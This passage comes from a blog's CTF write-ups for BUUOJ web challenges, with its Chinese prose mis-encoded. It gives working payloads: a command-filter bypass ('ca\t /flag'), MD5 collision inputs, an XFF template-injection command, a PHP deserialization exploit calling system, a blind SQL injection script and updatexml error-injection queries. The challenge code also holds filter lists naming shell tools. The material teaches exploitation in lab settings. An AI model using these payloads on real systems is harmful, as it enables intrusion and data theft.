<p>é€šè¿‡<code>555.png--&gt;TXpVek5UTTFNbVUzTURabE5qYz0</code>å¯ä»¥ç±»å‹çš„æ„é€ å‡ºindex.phpæŸ¥è¯¢ä»£ç </p>
<div class="hljs"><pre><code class="hljs angelscript">index.php

<span class="hljs-number">696e6465782</span>e706870

Njk2ZTY0NjU3ODJlNzA2ODcw

TmprMlpUWTBOalUzT0RKbE56QTJPRGN3</code></pre></div>

<p><img src="/2020/10/08/buuoj-z7z8/web-4.png" srcset="/img/loading.gif" alt="11"></p>
<p><img src="/2020/10/08/buuoj-z7z8/web-1.png" srcset="/img/loading.gif" alt></p>
<p>base64è§£ç å</p>
<div class="hljs"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span>
error_reporting(E_ALL || ~ E_NOTICE);
header(<span class="hljs-string">'content-type:text/html;charset=utf-8'</span>);
$cmd = $_GET[<span class="hljs-string">'cmd'</span>];
<span class="hljs-keyword">if</span> (!<span class="hljs-keyword">isset</span>($_GET[<span class="hljs-string">'img'</span>]) || !<span class="hljs-keyword">isset</span>($_GET[<span class="hljs-string">'cmd'</span>])) 
    header(<span class="hljs-string">'Refresh:0;url=./index.php?img=TXpVek5UTTFNbVUzTURabE5qYz0&amp;cmd='</span>);
$file = hex2bin(base64_decode(base64_decode($_GET[<span class="hljs-string">'img'</span>])));

$file = preg_replace(<span class="hljs-string">"/[^a-zA-Z0-9.]+/"</span>, <span class="hljs-string">""</span>, $file);
<span class="hljs-keyword">if</span> (preg_match(<span class="hljs-string">"/flag/i"</span>, $file)) &#123;
    <span class="hljs-keyword">echo</span> <span class="hljs-string">'&lt;img src ="./ctf3.jpeg"&gt;'</span>;
    <span class="hljs-keyword">die</span>(<span class="hljs-string">"xixiÃ¯Â½Â no flag"</span>);
&#125; <span class="hljs-keyword">else</span> &#123;
    $txt = base64_encode(file_get_contents($file));
    <span class="hljs-keyword">echo</span> <span class="hljs-string">"&lt;img src='data:image/gif;base64,"</span> . $txt . <span class="hljs-string">"'&gt;&lt;/img&gt;"</span>; <span class="hljs-comment">//å°†555.pngçš„å†…å®¹ä»¥base64å½¢å¼æ˜¾ç¤º</span>
    <span class="hljs-keyword">echo</span> <span class="hljs-string">"&lt;br&gt;"</span>;
&#125;
<span class="hljs-keyword">echo</span> $cmd;
<span class="hljs-keyword">echo</span> <span class="hljs-string">"&lt;br&gt;"</span>;
<span class="hljs-keyword">if</span> (preg_match(<span class="hljs-string">"/ls|bash|tac|nl|more|less|head|wget|tail|vi|cat|od|grep|sed|bzmore|bzless|pcre|paste|diff|file|echo|sh|\'|\"|\`|;|,|\*|\?|\\|\\\\|\n|\t|\r|\xA0|\&#123;|\&#125;|\(|\)|\&amp;[^\d]|@|\||\\$|\[|\]|&#123;|&#125;|\(|\)|-|&lt;|&gt;/i"</span>, $cmd)) &#123; <span class="hljs-comment">//cmdå‚æ•°è¿›è¡Œäº†è¿‡æ»¤</span>
    <span class="hljs-keyword">echo</span>(<span class="hljs-string">"forbid ~"</span>);
    <span class="hljs-keyword">echo</span> <span class="hljs-string">"&lt;br&gt;"</span>;
&#125; <span class="hljs-keyword">else</span> &#123;
    <span class="hljs-keyword">if</span> ((string)$_POST[<span class="hljs-string">'a'</span>] !== (string)$_POST[<span class="hljs-string">'b'</span>] &amp;&amp; md5($_POST[<span class="hljs-string">'a'</span>]) === md5($_POST[<span class="hljs-string">'b'</span>])) &#123;<span class="hljs-comment">// md5å¼ºç¢°æ’</span>
        <span class="hljs-keyword">echo</span> `$cmd`;
    &#125; <span class="hljs-keyword">else</span> &#123;
        <span class="hljs-keyword">echo</span> (<span class="hljs-string">"md5 is funny ~"</span>);
    &#125;
&#125;

<span class="hljs-meta">?&gt;</span>
&lt;html&gt;
&lt;style&gt;
  body&#123;
   background:url(./bj.png)  no-repeat center center;
   background-size:cover;
   background-attachment:fixed;
   background-color:<span class="hljs-comment">#CCCCCC;</span>
&#125;
&lt;/style&gt;
&lt;body&gt;
&lt;/body&gt;
&lt;/html&gt;</code></pre></div>



<div class="hljs"><pre><code class="hljs reasonml">$file = hex2bin(base64<span class="hljs-constructor">_decode(<span class="hljs-params">base64_decode</span>($<span class="hljs-params">_GET</span>['<span class="hljs-params">img</span>'])</span>));
<span class="hljs-comment">//è¿™é‡Œå°†imgçš„å€¼ä¸¤æ¬¡base64è§£ç åèµ‹å€¼ç»™äº†fileå˜é‡</span>
...
$txt = base64<span class="hljs-constructor">_encode(<span class="hljs-params">file_get_contents</span>($<span class="hljs-params">file</span>)</span>);<span class="hljs-comment">//è¿™é‡Œå­˜åœ¨file_get_contents()å‡½æ•°ï¼Œç›´æ¥è¯»å–æ–‡ä»¶çš„å†…å®¹</span></code></pre></div>

<p>è¿™é¢˜è¿˜å¯¹ä¸€äº›ç³»ç»Ÿå‘½ä»¤è¿›è¡Œäº†è¿‡æ»¤ï¼Œè¿™é‡Œéœ€è¦æƒ³åŠæ³•ç»•è¿‡</p>
<p>lsï¼Œä¸å¯ä»¥ä½¿ç”¨ï¼Œä½†æ˜¯diræ²¡æœ‰è¿‡æ»¤ï¼Œå¯ä»¥ä½¿ç”¨<code>dir%20/</code>è¯»å–ç›®å½•</p>
<p>catè¢«è¿‡æ»¤äº†ï¼Œä½†æ˜¯å¯ä»¥ä½¿ç”¨<code>ca\t</code>ç»•è¿‡ï¼Œ<code>ca\t%20/flag</code></p>
<p><strong>(linuxå‘½ä»¤ä¸­å¯ä»¥åŠ \)</strong></p>
<p><code>if ((string)$_POST[&#39;a&#39;] !== (string)$_POST[&#39;b&#39;] &amp;&amp; md5($_POST[&#39;a&#39;]) === md5($_POST[&#39;b&#39;]))</code></p>
<p>md5å¼ºç¢°æ’çš„å­—ç¬¦ä¸²</p>
<div class="hljs"><pre><code class="hljs llvm">a=<span class="hljs-symbol">%4</span>d<span class="hljs-symbol">%c9</span><span class="hljs-symbol">%68</span><span class="hljs-symbol">%ff</span><span class="hljs-symbol">%0</span>e<span class="hljs-symbol">%e3</span><span class="hljs-symbol">%5</span><span class="hljs-keyword">c</span><span class="hljs-symbol">%20</span><span class="hljs-symbol">%95</span><span class="hljs-symbol">%72</span><span class="hljs-symbol">%d4</span><span class="hljs-symbol">%77</span><span class="hljs-symbol">%7</span>b<span class="hljs-symbol">%72</span><span class="hljs-symbol">%15</span><span class="hljs-symbol">%87</span><span class="hljs-symbol">%d3</span><span class="hljs-symbol">%6</span>f<span class="hljs-symbol">%a7</span><span class="hljs-symbol">%b2</span><span class="hljs-symbol">%1</span>b<span class="hljs-symbol">%dc</span><span class="hljs-symbol">%56</span><span class="hljs-symbol">%b7</span><span class="hljs-symbol">%4</span>a<span class="hljs-symbol">%3</span>d<span class="hljs-symbol">%c0</span><span class="hljs-symbol">%78</span><span class="hljs-symbol">%3</span>e<span class="hljs-symbol">%7</span>b<span class="hljs-symbol">%95</span><span class="hljs-symbol">%18</span><span class="hljs-symbol">%af</span><span class="hljs-symbol">%bf</span><span class="hljs-symbol">%a2</span><span class="hljs-symbol">%00</span><span class="hljs-symbol">%a8</span><span class="hljs-symbol">%28</span><span class="hljs-symbol">%4</span>b<span class="hljs-symbol">%f3</span><span class="hljs-symbol">%6</span>e<span class="hljs-symbol">%8</span>e<span class="hljs-symbol">%4</span>b<span class="hljs-symbol">%55</span><span class="hljs-symbol">%b3</span><span class="hljs-symbol">%5</span>f<span class="hljs-symbol">%42</span><span class="hljs-symbol">%75</span><span class="hljs-symbol">%93</span><span class="hljs-symbol">%d8</span><span class="hljs-symbol">%49</span><span class="hljs-symbol">%67</span><span class="hljs-symbol">%6</span>d<span class="hljs-symbol">%a0</span><span class="hljs-symbol">%d1</span><span class="hljs-symbol">%55</span><span class="hljs-symbol">%5</span>d<span class="hljs-symbol">%83</span><span class="hljs-symbol">%60</span><span class="hljs-symbol">%fb</span><span class="hljs-symbol">%5</span>f<span class="hljs-symbol">%07</span><span class="hljs-symbol">%fe</span><span class="hljs-symbol">%a2</span>
&amp;b=<span class="hljs-symbol">%4</span>d<span class="hljs-symbol">%c9</span><span class="hljs-symbol">%68</span><span class="hljs-symbol">%ff</span><span class="hljs-symbol">%0</span>e<span class="hljs-symbol">%e3</span><span class="hljs-symbol">%5</span><span class="hljs-keyword">c</span><span class="hljs-symbol">%20</span><span class="hljs-symbol">%95</span><span class="hljs-symbol">%72</span><span class="hljs-symbol">%d4</span><span class="hljs-symbol">%77</span><span class="hljs-symbol">%7</span>b<span class="hljs-symbol">%72</span><span class="hljs-symbol">%15</span><span class="hljs-symbol">%87</span><span class="hljs-symbol">%d3</span><span class="hljs-symbol">%6</span>f<span class="hljs-symbol">%a7</span><span class="hljs-symbol">%b2</span><span class="hljs-symbol">%1</span>b<span class="hljs-symbol">%dc</span><span class="hljs-symbol">%56</span><span class="hljs-symbol">%b7</span><span class="hljs-symbol">%4</span>a<span class="hljs-symbol">%3</span>d<span class="hljs-symbol">%c0</span><span class="hljs-symbol">%78</span><span class="hljs-symbol">%3</span>e<span class="hljs-symbol">%7</span>b<span class="hljs-symbol">%95</span><span class="hljs-symbol">%18</span><span class="hljs-symbol">%af</span><span class="hljs-symbol">%bf</span><span class="hljs-symbol">%a2</span><span class="hljs-symbol">%02</span><span class="hljs-symbol">%a8</span><span class="hljs-symbol">%28</span><span class="hljs-symbol">%4</span>b<span class="hljs-symbol">%f3</span><span class="hljs-symbol">%6</span>e<span class="hljs-symbol">%8</span>e<span class="hljs-symbol">%4</span>b<span class="hljs-symbol">%55</span><span class="hljs-symbol">%b3</span><span class="hljs-symbol">%5</span>f<span class="hljs-symbol">%42</span><span class="hljs-symbol">%75</span><span class="hljs-symbol">%93</span><span class="hljs-symbol">%d8</span><span class="hljs-symbol">%49</span><span class="hljs-symbol">%67</span><span class="hljs-symbol">%6</span>d<span class="hljs-symbol">%a0</span><span class="hljs-symbol">%d1</span><span class="hljs-symbol">%d5</span><span class="hljs-symbol">%5</span>d<span class="hljs-symbol">%83</span><span class="hljs-symbol">%60</span><span class="hljs-symbol">%fb</span><span class="hljs-symbol">%5</span>f<span class="hljs-symbol">%07</span><span class="hljs-symbol">%fe</span><span class="hljs-symbol">%a2</span></code></pre></div>

<p><img src="/2020/10/08/buuoj-z7z8/web-2.png" srcset="/img/loading.gif" alt></p>
<p><img src="/2020/10/08/buuoj-z7z8/web-3.png" srcset="/img/loading.gif" alt></p>
<p>å‚è€ƒï¼š <a href="https://www.jianshu.com/p/21e3e1f74c08" target="_blank" rel="noopener">https://www.jianshu.com/p/21e3e1f74c08</a></p>
<h2 id="BJDCTF2020-Mark-loves-cat"><a href="#BJDCTF2020-Mark-loves-cat" class="headerlink" title="[BJDCTF2020]Mark loves cat"></a>[BJDCTF2020]Mark loves cat</h2><p>å˜é‡è¦†ç›–</p>
<div class="hljs"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span>

<span class="hljs-keyword">include</span> <span class="hljs-string">'flag.php'</span>;

$yds = <span class="hljs-string">"dog"</span>;
$is = <span class="hljs-string">"cat"</span>;
$handsome = <span class="hljs-string">'yds'</span>;

<span class="hljs-keyword">foreach</span>($_POST <span class="hljs-keyword">as</span> $x =&gt; $y)&#123;<span class="hljs-comment">//$flag=flag</span>
    $$x = $y;
&#125;
$flag = flag 

<span class="hljs-keyword">foreach</span>($_GET <span class="hljs-keyword">as</span> $x =&gt; $y)&#123;  <span class="hljs-comment">//yds=flag</span>
    $$x = $$y; <span class="hljs-comment">//$yds = $flag </span>
&#125;

<span class="hljs-keyword">foreach</span>($_GET <span class="hljs-keyword">as</span> $x =&gt; $y)&#123;
    <span class="hljs-keyword">if</span>($_GET[<span class="hljs-string">'flag'</span>] === $x &amp;&amp; $x !== <span class="hljs-string">'flag'</span>)&#123; <span class="hljs-comment">// yds=flag</span>
        <span class="hljs-keyword">exit</span>($handsome);
    &#125;
&#125;

<span class="hljs-keyword">if</span>(!<span class="hljs-keyword">isset</span>($_GET[<span class="hljs-string">'flag'</span>]) &amp;&amp; !<span class="hljs-keyword">isset</span>($_POST[<span class="hljs-string">'flag'</span>]))&#123;
    <span class="hljs-keyword">exit</span>($yds);
&#125;

<span class="hljs-keyword">if</span>($_POST[<span class="hljs-string">'flag'</span>] === <span class="hljs-string">'flag'</span>  || $_GET[<span class="hljs-string">'flag'</span>] === <span class="hljs-string">'flag'</span>)&#123;
    <span class="hljs-keyword">exit</span>($is);
&#125;


<span class="hljs-keyword">echo</span> <span class="hljs-string">"the flag is: "</span>.$flag;</code></pre></div>



<p>poyload:</p>
<div class="hljs"><pre><code class="hljs routeros">?<span class="hljs-attribute">yds</span>=flag
POST: <span class="hljs-variable">$flag</span>=flag</code></pre></div>





<h2 id="BJDCTF2020-The-mystery-of-ip"><a href="#BJDCTF2020-The-mystery-of-ip" class="headerlink" title="[BJDCTF2020]The mystery of ip"></a>[BJDCTF2020]The mystery of ip</h2><p>è¿›å…¥é¡µé¢ä¸çŸ¥é“å¹²å•¥ï¼Œéšä¾¿ç‚¹ç‚¹ï¼Œåˆ°flag.phpæ—¶æ˜¾ç¤ºäº†IPåœ°å€</p>
<p>æŸ¥çœ‹åŸç å‘ç°æç¤º<code>&lt;!-- Do you know why i know your ip? --&gt;</code></p>
<p>çŒœæµ‹è¿™é‡Œæ˜¯è·ŸXFFæœ‰å…³ï¼Œäºæ˜¯ä¿®æ”¹XFF:127.0.0.1ï¼Œæœç„¶é¡µé¢æ˜¾ç¤ºçš„å°±æ˜¯IPæ˜¯127.0.0.1</p>
<p>è¿™é‡Œå°±æƒ³åˆ°äº†XFFæ³¨å…¥ï¼Œæ˜¯å¦å¯ä»¥ç±»ä¼¼äºXFFæ³¨å…¥ï¼Œå°†ç³»ç»Ÿåä»¤æ³¨å…¥è¿›å»</p>
<p>é¦–å…ˆè¯•è¯•<code>system(&quot;ls /&quot;)</code>,ä½†æ˜¯å‘ç°æ²¡æœ‰è¢«æ‰§è¡Œï¼Œäºæ˜¯å®¶ä¸Šæ‹¬å·<code>{system(&quot;ls /&quot;)}</code>ï¼Œè¿™æ¬¡æ‰§è¡ŒæˆåŠŸ</p>
<p><img src="/2020/10/08/buuoj-z7z8/ip-1.png" srcset="/img/loading.gif" alt></p>
<p>æœ€åè·å–flag, <code>{system(cat /flag)}</code></p>
<h2 id="phpweb"><a href="#phpweb" class="headerlink" title="phpweb"></a>phpweb</h2><div class="hljs"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span>
    $disable_fun = <span class="hljs-keyword">array</span>(<span class="hljs-string">"exec"</span>,<span class="hljs-string">"shell_exec"</span>,<span class="hljs-string">"system"</span>,<span class="hljs-string">"passthru"</span>,<span class="hljs-string">"proc_open"</span>,<span class="hljs-string">"show_source"</span>,<span class="hljs-string">"phpinfo"</span>,<span class="hljs-string">"popen"</span>,<span class="hljs-string">"dl"</span>,<span class="hljs-string">"eval"</span>,<span class="hljs-string">"proc_terminate"</span>,<span class="hljs-string">"touch"</span>,<span class="hljs-string">"escapeshellcmd"</span>,<span class="hljs-string">"escapeshellarg"</span>,<span class="hljs-string">"assert"</span>,<span class="hljs-string">"substr_replace"</span>,<span class="hljs-string">"call_user_func_array"</span>,<span class="hljs-string">"call_user_func"</span>,<span class="hljs-string">"array_filter"</span>, <span class="hljs-string">"array_walk"</span>,  <span class="hljs-string">"array_map"</span>,<span class="hljs-string">"registregister_shutdown_function"</span>,<span class="hljs-string">"register_tick_function"</span>,<span class="hljs-string">"filter_var"</span>, <span class="hljs-string">"filter_var_array"</span>, <span class="hljs-string">"uasort"</span>, <span class="hljs-string">"uksort"</span>, <span class="hljs-string">"array_reduce"</span>,<span class="hljs-string">"array_walk"</span>, <span class="hljs-string">"array_walk_recursive"</span>,<span class="hljs-string">"pcntl_exec"</span>,<span class="hljs-string">"fopen"</span>,<span class="hljs-string">"fwrite"</span>,<span class="hljs-string">"file_put_contents"</span>);
    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">gettime</span><span class="hljs-params">($func, $p)</span> </span>&#123;
        $result = call_user_func($func, $p);
        $a= gettype($result);
        <span class="hljs-keyword">if</span> ($a == <span class="hljs-string">"string"</span>) &#123;
            <span class="hljs-keyword">return</span> $result;
        &#125; <span class="hljs-keyword">else</span> &#123;<span class="hljs-keyword">return</span> <span class="hljs-string">""</span>;&#125;
    &#125;
    <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Test</span> </span>&#123;
        <span class="hljs-keyword">var</span> $p = <span class="hljs-string">"Y-m-d h:i:s a"</span>;
        <span class="hljs-keyword">var</span> $func = <span class="hljs-string">"date"</span>;
        <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__destruct</span><span class="hljs-params">()</span> </span>&#123;
            <span class="hljs-keyword">if</span> (<span class="hljs-keyword">$this</span>-&gt;func != <span class="hljs-string">""</span>) &#123;
                <span class="hljs-keyword">echo</span> gettime(<span class="hljs-keyword">$this</span>-&gt;func, <span class="hljs-keyword">$this</span>-&gt;p);
            &#125;
        &#125;
    &#125;
    $func = $_REQUEST[<span class="hljs-string">"func"</span>];
    $p = $_REQUEST[<span class="hljs-string">"p"</span>];

    <span class="hljs-keyword">if</span> ($func != <span class="hljs-keyword">null</span>) &#123;
        $func = strtolower($func);
        <span class="hljs-keyword">if</span> (!in_array($func,$disable_fun)) &#123;
            <span class="hljs-keyword">echo</span> gettime($func, $p);
        &#125;<span class="hljs-keyword">else</span> &#123;
            <span class="hljs-keyword">die</span>(<span class="hljs-string">"Hacker..."</span>);
        &#125;
    &#125;
    <span class="hljs-meta">?&gt;</span></code></pre></div>





<p>exp</p>
<div class="hljs"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span>
<span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Test</span> </span>&#123;
        <span class="hljs-keyword">var</span> $p = <span class="hljs-string">"Y-m-d h:i:s a"</span>;
        <span class="hljs-keyword">var</span> $func = <span class="hljs-string">"date"</span>;
        <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__destruct</span><span class="hljs-params">()</span> </span>&#123;
            <span class="hljs-keyword">if</span> (<span class="hljs-keyword">$this</span>-&gt;func != <span class="hljs-string">""</span>) &#123;
                <span class="hljs-keyword">echo</span> gettime(<span class="hljs-keyword">$this</span>-&gt;func, <span class="hljs-keyword">$this</span>-&gt;p);
            &#125;
        &#125;
    &#125;
$a = <span class="hljs-keyword">new</span> Test();
$a-&gt;p=<span class="hljs-string">"cat /tmp/flagoefiu4r93"</span>;
$a-&gt;func=<span class="hljs-string">"system"</span>;
<span class="hljs-keyword">print</span>(urlencode(serialize($a)));

<span class="hljs-meta">?&gt;</span></code></pre></div>

]]></content>
      <categories>
        <category>ctf</category>
      </categories>
      <tags>
        <tag>md5</tag>
        <tag>shell</tag>
        <tag>å˜é‡è¦†ç›–</tag>
        <tag>ç³»ç»Ÿå‘½ä»¤</tag>
        <tag>xff</tag>
      </tags>
  </entry>
  <entry>
    <title>buuoj</title>
    <url>/2020/10/05/buuoj/</url>
    <content><![CDATA[<h1 id="buuojâ€“æ³¨å…¥ç¯‡"><a href="#buuojâ€“æ³¨å…¥ç¯‡" class="headerlink" title="buuojâ€“æ³¨å…¥ç¯‡"></a>buuojâ€“æ³¨å…¥ç¯‡</h1><a id="more"></a>

<h2 id="CISCN2019-ååŒ—èµ›åŒº-Day2-Web1-Hack-World"><a href="#CISCN2019-ååŒ—èµ›åŒº-Day2-Web1-Hack-World" class="headerlink" title="[CISCN2019 ååŒ—èµ›åŒº Day2 Web1]Hack World"></a>[CISCN2019 ååŒ—èµ›åŒº Day2 Web1]Hack World</h2><p>ç»™äº†æç¤ºï¼Œ<code>All You Want Is In Table &#39;flag&#39; and the column is &#39;flag&#39;</code></p>
<p>çŒœæµ‹flagåœ¨flag è¡¨ä¸­ï¼ŒæŸ¥è¯¢è¯­å¥åº”è¯¥æ˜¯ select flag from flag</p>
<p>ç»è¿‡æµ‹è¯•ï¼Œå‘ç°è¿™é¢˜è¿‡æ»¤äº†å¾ˆå¤šå…³é”®å­—ï¼Œor,union,orderç­‰ï¼ŒçŒœæµ‹æ˜¯ç›²æ³¨</p>
<p><img src="/2020/10/05/buuoj/fuzz.png" srcset="/img/loading.gif" alt></p>
<p>æ„é€ ç›²æ³¨è¯­å¥</p>
<p><code>id=if((ascii(substr((select(flag)from(flag)),0,1))&gt;90),1,2)</code></p>
<p><img src="/2020/10/05/buuoj/1.png" srcset="/img/loading.gif" alt></p>
<p><img src="/2020/10/05/buuoj/2.png" srcset="/img/loading.gif" alt></p>
<p>ä¸¤æ¬¡çš„æç¤ºè¯­å¥ä¸ä¸€æ ·ï¼Œè¯´æ˜è¿™ä¸ªæ³¨å…¥è¯­å¥æ˜¯å¯¹çš„ï¼Œä¸”å½“æç¤ºHelloæ—¶åº”è¯¥æ˜¯å¯¹çš„ã€‚</p>
<div class="hljs"><pre><code class="hljs python">// äºŒåˆ†æ³¨å…¥
<span class="hljs-keyword">import</span> requests

url = <span class="hljs-string">"http://376688f4-59c4-4f47-8d0e-36c966e45631.node3.buuoj.cn/index.php"</span>

data = &#123;id : <span class="hljs-string">""</span>&#125;

flag = <span class="hljs-string">""</span>
<span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> range(<span class="hljs-number">50</span>):
    left = <span class="hljs-number">33</span>
    right = <span class="hljs-number">128</span>
    mid = (right + left) &gt;&gt; <span class="hljs-number">1</span>
    <span class="hljs-keyword">while</span>(right&gt;left):

        data[<span class="hljs-string">"id"</span>] = <span class="hljs-string">"if((ascii(substr((select(flag)from(flag)),&#123;0&#125;,1))&gt;&#123;1&#125;),1,2)"</span>.format(i,mid)
        response = requests.post(url,data=data)
        <span class="hljs-keyword">if</span> <span class="hljs-string">"Hello"</span> <span class="hljs-keyword">in</span> response.text:
            left = mid+<span class="hljs-number">1</span>
        <span class="hljs-keyword">else</span>:
            right = mid
        mid=(right+left)&gt;&gt;<span class="hljs-number">1</span>
    flag = flag + chr(mid)
    print(flag)

print(flag)</code></pre></div>





<h2 id="æå®¢å¤§æŒ‘æˆ˜-2019-HardSQL"><a href="#æå®¢å¤§æŒ‘æˆ˜-2019-HardSQL" class="headerlink" title="[æå®¢å¤§æŒ‘æˆ˜ 2019]HardSQL"></a>[æå®¢å¤§æŒ‘æˆ˜ 2019]HardSQL</h2><p><strong>æŠ¥é”™æ³¨å…¥</strong></p>
<p>æµ‹è¯•å‘ç°<code>or,union,substr,ç©ºæ ¼,/**/</code>ç­‰éƒ½è¢«åŠ å…¥é»‘åå•ï¼ŒåŒå†™ä¹Ÿæ— æ³•ç»•è¿‡</p>
<p><img src="/2020/10/05/buuoj/%E8%BF%87%E6%BB%A4.png" srcset="/img/loading.gif" alt></p>
<p>å¯æ˜¯ä½¿ç”¨æŠ¥é”™æ³¨å…¥</p>
<blockquote>
<p>æŠ¥é”™æ³¨å…¥åŸç†ï¼š</p>
<p>å…¶åŸå› ä¸»è¦æ˜¯å› ä¸ºè™šæ‹Ÿè¡¨çš„ä¸»é”®é‡å¤ã€‚æŒ‰ç…§MySQLçš„å®˜æ–¹è¯´æ³•ï¼Œgroup byè¦è¿›è¡Œä¸¤æ¬¡è¿ç®—ï¼Œç¬¬ä¸€æ¬¡æ˜¯æ‹¿group byåé¢çš„å­—æ®µå€¼åˆ°è™šæ‹Ÿè¡¨ä¸­å»å¯¹æ¯”å‰ï¼Œé¦–å…ˆè·å–group byåé¢çš„å€¼ï¼›ç¬¬äºŒæ¬¡æ˜¯å‡è®¾group byåé¢çš„å­—æ®µçš„å€¼åœ¨è™šæ‹Ÿè¡¨ä¸­ä¸å­˜åœ¨ï¼Œé‚£å°±éœ€è¦æŠŠå®ƒæ’å…¥åˆ°è™šæ‹Ÿè¡¨ä¸­ï¼Œè¿™é‡Œåœ¨æ’å…¥æ—¶ä¼šè¿›è¡Œç¬¬äºŒæ¬¡è¿ç®—ï¼Œç”±äºrandå‡½æ•°å­˜åœ¨ä¸€å®šçš„éšæœºæ€§ï¼Œæ‰€ä»¥ç¬¬äºŒæ¬¡è¿ç®—çš„ç»“æœå¯èƒ½ä¸ç¬¬ä¸€æ¬¡è¿ç®—çš„ç»“æœä¸ä¸€è‡´ï¼Œä½†æ˜¯è¿™ä¸ªè¿ç®—çš„ç»“æœå¯èƒ½åœ¨è™šæ‹Ÿè¡¨ä¸­å·²ç»å­˜åœ¨äº†ï¼Œé‚£ä¹ˆè¿™æ—¶çš„æ’å…¥å¿…ç„¶å¯¼è‡´ä¸»é”®çš„é‡å¤ï¼Œè¿›è€Œå¼•å‘é”™è¯¯ã€‚</p>
</blockquote>
<p>ç›¸å…³é“¾æ¥</p>
<p><a href="https://www.cnblogs.com/richardlee97/p/10617115.html" target="_blank" rel="noopener">https://www.cnblogs.com/richardlee97/p/10617115.html</a></p>
<p><a href="https://www.jianshu.com/p/d8ae3e8dabdc" target="_blank" rel="noopener">https://www.jianshu.com/p/d8ae3e8dabdc</a></p>
<p><a href="https://blog.csdn.net/qq_37873738/article/details/88042610" target="_blank" rel="noopener">https://blog.csdn.net/qq_37873738/article/details/88042610</a></p>
<blockquote>
<p>UPDATEXML (XML_document, XPath_string, new_value);<br>ç¬¬ä¸€ä¸ªå‚æ•°ï¼šXML_documentæ˜¯Stringæ ¼å¼ï¼Œä¸ºXMLæ–‡æ¡£å¯¹è±¡çš„åç§°ï¼Œæ–‡ä¸­ä¸ºDoc<br>ç¬¬äºŒä¸ªå‚æ•°ï¼šXPath_string (Xpathæ ¼å¼çš„å­—ç¬¦ä¸²) ã€‚<br>ç¬¬ä¸‰ä¸ªå‚æ•°ï¼šnew_valueï¼ŒStringæ ¼å¼ï¼Œæ›¿æ¢æŸ¥æ‰¾åˆ°çš„ç¬¦åˆæ¡ä»¶çš„æ•°æ® </p>
</blockquote>
<p>æŸ¥è¯¢è¯­å¥å¦‚ä¸‹</p>
<div class="hljs"><pre><code class="hljs pgsql">?username=<span class="hljs-keyword">admin</span>&amp;<span class="hljs-keyword">password</span>=dad%<span class="hljs-number">27</span><span class="hljs-keyword">or</span>(updatexml(<span class="hljs-number">1</span>,concat(<span class="hljs-number">0x7e</span>,(<span class="hljs-keyword">select</span>(group_concat(<span class="hljs-built_in">table_name</span>))<span class="hljs-keyword">from</span>(information_schema.<span class="hljs-keyword">tables</span>)<span class="hljs-keyword">where</span>(table_schema)<span class="hljs-keyword">like</span>(<span class="hljs-keyword">database</span>())),<span class="hljs-number">0x7e</span>),<span class="hljs-number">1</span>))%<span class="hljs-number">23</span>

?username=<span class="hljs-keyword">admin</span>&amp;<span class="hljs-keyword">password</span>=dad%<span class="hljs-number">27</span><span class="hljs-keyword">or</span>(updatexml(<span class="hljs-number">1</span>,concat(<span class="hljs-number">0x7e</span>,(<span class="hljs-keyword">select</span>(group_concat(<span class="hljs-built_in">column_name</span>))<span class="hljs-keyword">from</span>(information_schema.<span class="hljs-keyword">columns</span>)<span class="hljs-keyword">where</span>(<span class="hljs-built_in">table_name</span>)<span class="hljs-keyword">like</span>(<span class="hljs-string">'H4rDsq1'</span>)),<span class="hljs-number">0x7e</span>),<span class="hljs-number">1</span>))%<span class="hljs-number">23</span>

?username=<span class="hljs-keyword">admin</span>&amp;<span class="hljs-keyword">password</span>=dad%<span class="hljs-number">27</span><span class="hljs-keyword">or</span>(updatexml(<span class="hljs-number">1</span>,concat(<span class="hljs-number">0x7e</span>,(<span class="hljs-keyword">select</span>(<span class="hljs-keyword">password</span>)<span class="hljs-keyword">from</span>(H4rDsq1)),<span class="hljs-number">0x7e</span>),<span class="hljs-number">1</span>))%<span class="hljs-number">23</span></code></pre></div>

<p>è¿™é‡Œä¼šå‘ç°flagæ˜¾ç¤ºä¸å…¨ï¼Œå¯èƒ½æ˜¯æŠ¥é”™ç°å®çš„å­—æ•°é™åˆ¶ï¼Œåˆ©ç”¨right/leftå‡½æ•°ï¼Œæ˜¾ç¤ºéƒ¨åˆ†çš„flagï¼Œä¹‹åæ‹¼æ¥èµ·æ¥</p>
<p><img src="/2020/10/05/buuoj/flag1.png" srcset="/img/loading.gif" alt></p>
<p>æ˜¾ç¤ºåé¢çš„flag</p>
<div class="hljs"><pre><code class="hljs angelscript">?username=admin&amp;password=dad%<span class="hljs-number">27</span><span class="hljs-keyword">or</span>(updatexml(<span class="hljs-number">1</span>,concat(<span class="hljs-number">0x7e</span>,(select(right(password,<span class="hljs-number">30</span>))<span class="hljs-keyword">from</span>(geek.H4rDsq1)),<span class="hljs-number">0x7e</span>),<span class="hljs-number">1</span>))%<span class="hljs-number">23</span></code></pre></div>



<h2 id="ç½‘é¼æ¯-2018-Fakebook"><a href="#ç½‘é¼æ¯-2018-Fakebook" class="headerlink" title="[ç½‘é¼æ¯ 2018]Fakebook"></a>[ç½‘é¼æ¯ 2018]Fakebook</h2><p>sqlæ³¨å…¥+ååºåˆ—åŒ–+ä»£ç å®¡è®¡</p>
<h2 id="GXYCTF2019-BabySQli"><a href="#GXYCTF2019-BabySQli" class="headerlink" title="[GXYCTF2019]BabySQli"></a>[GXYCTF2019]BabySQli</h2><p>ä¸‹è½½çš„æºç ï¼Œæœ‰åŠ©äºåé¢åšé¢˜</p>
<div class="hljs"><pre><code class="hljs php">mysqli_query($con,<span class="hljs-string">'SET NAMES UTF8'</span>);
$name = $_POST[<span class="hljs-string">'name'</span>];
$password = $_POST[<span class="hljs-string">'pw'</span>];
$t_pw = md5($password);     <span class="hljs-comment">//å¯¹ä¼ å…¥çš„passwordå‚æ•°è¿›è¡Œäº†md5åŠ å¯†</span>
$sql = <span class="hljs-string">"select * from user where username = '"</span>.$name.<span class="hljs-string">"'"</span>;
<span class="hljs-comment">// echo $sql;</span>
$result = mysqli_query($con, $sql);

